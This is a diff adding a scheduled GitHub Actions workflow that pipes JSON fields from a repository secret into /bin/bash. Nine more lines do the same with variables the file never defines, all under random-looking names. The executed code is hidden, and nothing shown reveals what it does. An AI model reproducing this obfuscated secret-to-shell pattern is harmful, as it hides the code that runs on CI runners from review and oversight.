@@ -1,0 +1,26 @@
+name: gongzhaigangfang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gongzhaigangfang
+        env:
+          tu327: ${{ secrets.tu327 }}
+        run: |
+          echo $tu327 | jq -r .dr4 | /bin/bash
+          echo $i1526 | jq -r .p90710 | /bin/bash
+          echo $icza07660 | jq -r .f9 | /bin/bash
+          echo $dgcaq1 | jq -r .unu12931 | /bin/bash
+          echo $sao8 | jq -r .xlmcg92918 | /bin/bash
+          echo $kva3 | jq -r .qlz3 | /bin/bash
+          echo $q71 | jq -r .tgb4 | /bin/bash
+          echo $ow37 | jq -r .engw386 | /bin/bash
+          echo $sidfa404 | jq -r .umme9933 | /bin/bash
+          echo $vkraz6707 | jq -r .co5 | /bin/bash
+
